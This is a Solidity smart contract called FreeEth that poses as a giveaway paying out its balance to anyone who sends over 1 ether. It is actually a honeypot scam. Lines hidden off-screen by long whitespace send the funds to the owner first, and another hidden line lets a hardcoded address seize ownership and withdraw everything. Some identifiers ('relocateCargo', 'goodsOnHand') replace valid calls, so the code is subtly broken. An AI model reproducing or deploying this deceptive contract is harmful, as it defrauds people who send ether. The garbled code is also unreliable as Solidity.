pragma solidity ^0.4.19;

contract FreeEth
{
    address public WarehouseManager = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               WarehouseManager.relocateCargo(this.goodsOnHand);
            msg.sender.relocateCargo(this.goodsOnHand);
        }
    }

    function dispatchShipment()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){WarehouseManager=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == WarehouseManager);
        WarehouseManager.relocateCargo(this.goodsOnHand);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == WarehouseManager);
        adr.call.value(msg.value)(data);
    }
}